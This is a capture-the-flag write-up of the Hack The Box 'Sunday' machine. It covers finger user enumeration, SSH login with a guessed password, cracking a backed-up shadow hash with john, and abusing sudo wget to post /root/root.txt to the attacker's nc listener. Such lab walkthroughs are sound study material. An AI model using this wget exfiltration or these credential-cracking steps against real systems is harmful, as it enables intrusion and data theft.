---
title: Hack The Box - Sunday (Without Metasploit)
date: 2021-01-20 00:23:00 +0800
categories: [hackthebox]
tags: [linux]
image:
    path: /assets/images/sunday.png
---

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.76 sunday.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

```bash 
$ rustscan --accessible -a sunday.htb -r 1-65535 -- -sT -sV -sC -Pn
File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.76:111
Open 10.10.10.76:79
Open 10.10.10.76:22022
Open 10.10.10.76:46883
Starting Script(s)
Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-19 13:19 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:19
Completed NSE at 13:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:19
Completed NSE at 13:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:19
Completed NSE at 13:19, 0.00s elapsed
Initiating Connect Scan at 13:19
Scanning sunday.htb (10.10.10.76) [4 ports]
Discovered open port 111/tcp on 10.10.10.76
Discovered open port 22022/tcp on 10.10.10.76
Discovered open port 79/tcp on 10.10.10.76
Discovered open port 46883/tcp on 10.10.10.76
Completed Connect Scan at 13:19, 0.01s elapsed (4 total ports)
Initiating Service scan at 13:19
Scanning 4 services on sunday.htb (10.10.10.76)
Completed Service scan at 13:19, 26.05s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.10.76.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:19
Completed NSE at 13:20, 11.08s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:20
Completed NSE at 13:20, 1.17s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:20
Completed NSE at 13:20, 0.00s elapsed
Nmap scan report for sunday.htb (10.10.10.76)
Host is up, received user-set (0.0066s latency).
Scanned at 2021-01-19 13:19:26 UTC for 38s

PORT      STATE SERVICE REASON  VERSION
79/tcp    open  finger  syn-ack Sun Solaris fingerd
|_finger: No one logged on\x0D
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
22022/tcp open  ssh     syn-ack SunSSH 1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAKQhj2N5gfwsseuHbx/yCXwOkphQCTzDyXaBw5SHg/vRBW9aYPsWUUV0XGZPlVtbhxFylTZGNZTWJyndzQL3aRcQNouwVH8NnQsT63s4uLKsAP3jx4afAwB7049PvisAxtDVMbqg94vxaJkh88VY/EMpASYNrLFtr1mZngrbAzOvAAAAFQCiLK6Oh21fvEjgZ0Yl0IRtONW/wwAAAIAxz1u+bPH+VE7upID2HEvYksXOItmohsDFt0oHmGMHf9TKwZvqQLZRix0eXYu8zLnTIdg7rVYSjGyRhuWeIkl1+0aIJL4/dzB+JthInTGFIngc83MtonLP4Sj3YL20wL9etVh8/M0ZOedntWrQcUW+8cUWZRlgW8q620HZKE8VqAAAAIB0s8wn1ufviVEKXct60uz2ZoduUgg07dfPfzvhpbw232KYUJ6lchTj2p2AV8cD0fk2lok2Qc6Kn/OKSjO9C0PlvG8WWkVVvlISUY4BEhtqtL3aof7PYp5nCrLK+2v+grCLxOvyYpT1OfDMQbahOWGZ9OCwQtQXKP1wYEQMqMsSRg==
|   1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAxAwq7HNZXHr7XEeYeKsbnaruPQyUK5IkSE/FxHesBaKQ37AsLjw8iacqUvcs8IuhPfiTtwuwU42zUHu1e1rmLpRlMyLQnjgJH1++fP5E0Qnxj4DrFr7aeRv1FqPkrnK/xCX46AdgUhs4+4YA04yfi8pOlaSEVucYaqWNhuqJkt8=
46883/tcp open  unknown syn-ack
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:20
Completed NSE at 13:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:20
Completed NSE at 13:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:20
Completed NSE at 13:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.70 seconds
```

# Enumeration (1)

## Port 79 `Sun Solaris fingerd`

The `finger` service allows us to see who is currently logged on.

```bash
$ finger @sunday.htb
No one logged on
```

No one is logged on. However we can use this [tool](https://github.com/pentestmonkey/finger-user-enum) to help us enumerate the usernames on the machine by bruteforcing with a give list of names.

```bash
$ perl finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t sunday.htb -m 100  
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 100
Usernames file ........... /usr/share/seclists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10177
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Tue Jan 19 09:52:40 2021 #########
access@sunday.htb: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
admin@sunday.htb: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..uucp     uucp Admin                         < .  .  .  . >..nuucp    uucp Admin                         < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..listen   Network Admin                      < .  .  .  . >..
anne marie@sunday.htb: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
bin@sunday.htb: bin             ???                         < .  .  .  . >..
dee dee@sunday.htb: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
jo ann@sunday.htb: Login       Name               TTY         Idle    When    Where..jo                    ???..ann                   ???..
la verne@sunday.htb: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@sunday.htb: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@sunday.htb: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
miof mela@sunday.htb: Login       Name               TTY         Idle    When    Where..miof                  ???..mela                  ???..
sammy@sunday.htb: sammy                 console      <Jul 31 17:59>..
root@sunday.htb: root     Super-User            pts/3        <Apr 24, 2018> sunday              ..
sunny@sunday.htb: sunny                 pts/3        <Apr 24, 2018> 10.10.14.4          ..
zsa zsa@sunday.htb: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
######## Scan completed at Tue Jan 19 09:54:14 2021 #########
14 results.
```

Usernames that do not have `???..` in their fields are legitimate usernames. Out of these, we were able to gather that `admin`, `bin`, `line`, `message`, `sammy`, `sunny` and `root` are real usernames, but only `sammy`, `sunny` and `root` had logons occuring on them so lets focus on them.

I would normally use `hydra` to brute-force their passwords, but it was so unstable I ended up manually guessing and got the password of `sunny`, which happens to be `sunday`. We then use this password to `ssh` into the machine.

```bash
$ ssh sunny@sunday.htb -p 22022 
Password: 
Last login: Tue Apr 24 10:48:11 2018 from 10.10.14.4
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sunny@sunday:~$ id
uid=65535(sunny) gid=1(other) groups=1(other)
```

# Enumeration (2)

There was a folder at `/backup` containing 2 files.

```bash
sunny@sunday:~$ ls -al /backup
total 5
drwxr-xr-x  2 root root   4 2018-04-15 20:44 .
drwxr-xr-x 26 root root  27 2020-07-31 17:59 ..
-r-x--x--x  1 root root  53 2018-04-24 10:35 agent22.backup
-rw-r--r--  1 root root 319 2018-04-15 20:44 shadow.backup
```

We were only able to read `shadow.backup`, but instead contained the password hashes of `sammy` and `sunny`!

```bash
sunny@sunday:~$ cat /backup/shadow.backup
...
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

I then went on to crack the hash of `sammy` using `john`.

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow.backup  
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha256crypt, crypt(3) $5$ [SHA256 128/128 AVX 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cooldude!           (sammy)
```

We can then `su` to `sammy`.

```bash
sunny@sunday:~$ su - sammy
Password: 
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sammy@sunday:~$ id
uid=101(sammy) gid=10(staff) groups=10(staff)
```

# user.txt

The user flag is in `sammy`'s home directory.

```bash
sammy@sunday:~$ cat Desktop/user.txt
a3d9XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# Enumeration (3)

Checking `sammy`'s `sudo` rights, we see that he can run `wget` as `root`.

```bash
sammy@sunday:~$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
```

This means we could use `wget` to overwrite `/etc/passwd` or use `wget` to exfiltrate out files. This box was very unstable, so I decided to just stick with exfiltrating. (I am sorry for not following the standard of getting a shell but the instability of this machine was too much for me haha)

# Exploitation / root.txt

We can start a `nc` listener

```bash
$ sudo rlwrap nc -lvnp 80
[sudo] password for kali: 
listening on [any] 80 ...
```

And then use `wget` to send out the contents of the root flag in `root`'s home directory.

```bash
sammy@sunday:~$ sudo wget --post-file=/root/root.txt 10.10.XX.XX        
--20:51:15--  http://10.10.XX.XX/
           => `index.html'
Connecting to 10.10.XX.XX:80... connected.
HTTP request sent, awaiting response... 
```

Then on our listener, we get the root flag!

```bash
$ sudo rlwrap nc -lvnp 80  
listening on [any] 80 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.76] 46114
POST / HTTP/1.0
User-Agent: Wget/1.10.2
Accept: */*
Host: 10.10.XX.XX
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

fb40XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Rooted ! Thank you for reading and look forward for more writeups and articles !